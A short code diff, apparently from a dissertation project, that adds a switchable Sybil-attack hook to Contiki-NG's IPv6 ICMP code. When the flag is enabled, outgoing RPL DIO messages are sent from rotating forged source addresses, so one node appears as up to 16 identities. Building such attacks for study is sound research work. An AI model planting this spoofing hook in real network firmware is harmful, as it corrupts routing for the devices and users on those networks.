@@ -1,0 +1,25 @@
+diff --git a/os/net/ipv6/uip-icmp6.c b/os/net/ipv6/uip-icmp6.c
+--- a/os/net/ipv6/uip-icmp6.c
++++ b/os/net/ipv6/uip-icmp6.c
+@@
+ /** \brief temporary IP address */
+ static uip_ipaddr_t tmp_ipaddr;
+ 
++/* Dissertation Sybil hook. Default is OFF unless an experiment app overrides it. */
++int sybil_attack_enabled __attribute__((weak)) = 0;
++static uint16_t sybil_identity_counter;
++
+ LIST(echo_reply_callback_list);
+@@
+   memcpy(&UIP_IP_BUF->destipaddr, dest, sizeof(*dest));
+   uip_ds6_select_src(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr);
++  if(sybil_attack_enabled && type == ICMP6_RPL && code == 1) {
++    sybil_identity_counter++;
++    uip_ip6addr(&UIP_IP_BUF->srcipaddr, 0xfd00, 0, 0, 0, 0, 0, 0,
++                0xf000u + (sybil_identity_counter % 16u));
++    LOG_WARN("SYBIL: sending RPL DIO as virtual identity ");
++    LOG_WARN_6ADDR(&UIP_IP_BUF->srcipaddr);
++    LOG_WARN_("\n");
++  }
+ 
+   UIP_ICMP_BUF->type = type;
